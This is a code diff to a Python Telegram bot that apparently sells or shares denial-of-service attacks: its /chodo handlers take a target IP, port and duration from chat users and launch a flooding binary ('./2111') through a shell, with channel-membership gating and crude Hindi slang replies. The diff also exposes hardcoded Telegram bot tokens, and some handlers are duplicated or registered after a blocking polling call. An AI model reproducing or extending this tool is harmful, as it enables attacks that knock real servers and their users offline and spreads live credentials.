@@ -3,10 +3,8 @@ import subprocess
 import datetime
 import os
 
-from keep_alive import keep_alive
-keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7922125334:AAFrF9FEsEb-yesEmvrhgT7eV5XJl0X7hVM')
+bot = telebot.TeleBot('7358638297:AAHL87x_zdrmeGLP-zbUkInWIc08PVwWhqY')
 
 # Admin user IDs
 admin_id = {"7646520243"}
@@ -292,8 +290,8 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 243:
-                response = "Error: Time interval must be less than 243"
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
@@ -302,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./bad {target} {port} {time} 200 240 600 16"
+                    full_command = f"./2111 {target} {port} {time} 800"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
@@ -316,6 +314,26 @@ def handle_attack(message):
         response = "Nhi milega GROUP per Free hai Wha use krle."
 
     bot.reply_to(message, response)
+
+@bot.message_handler(commands=['ruko'])
+def stop_attack(message):
+    global attack_running, attack_process
+
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        if attack_running and attack_process:
+            attack_process.terminate()  # Stop running attack process
+            attack_running = False
+            attack_process = None
+            bot.reply_to(message, "❌ Attack stopped!")
+
+        # Send SIGINT to terminate bot process (Ctrl + C effect)
+        os.kill(os.getpid(), signal.SIGINT)
+    else:
+        bot.reply_to(message, "❌ Tumhare paas permission nahi hai!")
+
+
+bot.polling(none_stop=True)
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -446,3 +464,65 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
+
+# Channel ID jisme join check karna hai
+CHANNEL_USERNAME = "@BADMOSH100"
+
+# Function to check if user has joined the channel
+def is_member(user_id):
+    try:
+        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        if chat_member.status in ['member', 'administrator', 'creator']:
+            return True
+        else:
+            return False
+    except Exception as e:
+        return False
+
+# Modified handler for /chodo command with channel check
+@bot.message_handler(commands=['chodo'])
+def handle_attack(message):
+    global attack_running
+
+    user_id = str(message.chat.id)
+    
+    # Pehle check karo ki user ne channel join kiya hai ya nahi
+    if not is_member(user_id):
+        bot.reply_to(message, f"🔥 Pehle channel join karo: {CHANNEL_USERNAME}")
+        return
+
+    if user_id in allowed_user_ids:
+        if attack_running:
+            response = "Abhi Chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
+            bot.reply_to(message, response)
+            return
+
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
+            else:
+                attack_running = True
+                try:
+                    record_command_logs(user_id, '/chodo', target, port, time)
+                    log_command(user_id, target, port, time)
+
+                    # Simulate attack process
+                    full_command = f"./2111 {target} {port} {time} 800"
+                    subprocess.run(full_command, shell=True)
+
+                    response = "Chudai completed successfully."
+                except Exception as e:
+                    response = f"Error during attack: {str(e)}"
+                finally:
+                    attack_running = False
+        else:
+            response = "Usage: /chodo <target> <port> <time>"
+    else:
+        response = "Nhi milega GROUP per Free hai Wha use krle."
+
+    bot.reply_to(message, response)
